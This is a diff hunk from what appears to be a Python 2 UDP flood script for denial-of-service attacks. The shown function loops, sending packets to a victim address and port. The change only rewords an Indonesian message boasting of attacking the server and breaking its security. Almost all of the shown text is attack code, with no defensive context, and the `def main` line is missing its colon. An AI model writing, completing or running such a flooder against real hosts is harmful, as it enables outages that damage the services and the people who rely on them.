@@ -34,7 +34,7 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print "\033[1;91mMengirim Serangan Ke Server \033[1;32m%s \033[1;91mPaket Berhasil Terkirim Ke Alamat IP  \033[1;32m%s \033[1;91mBerhasil Merusak Keamanan Server \033[1;32m%s "%(sent, victim, vport)
+        print "\033[1;91mMengirim Serangan Ke Server \033[1;32m%s \033[1;91mPaket Berhasil Terkirim Ke Server  \033[1;32m%s \033[1;91mBerhasil Merusak Keamanan Server \033[1;32m%s "%(sent, victim, vport)
 def main
     if len(sys.argv) != 4:
         usage()
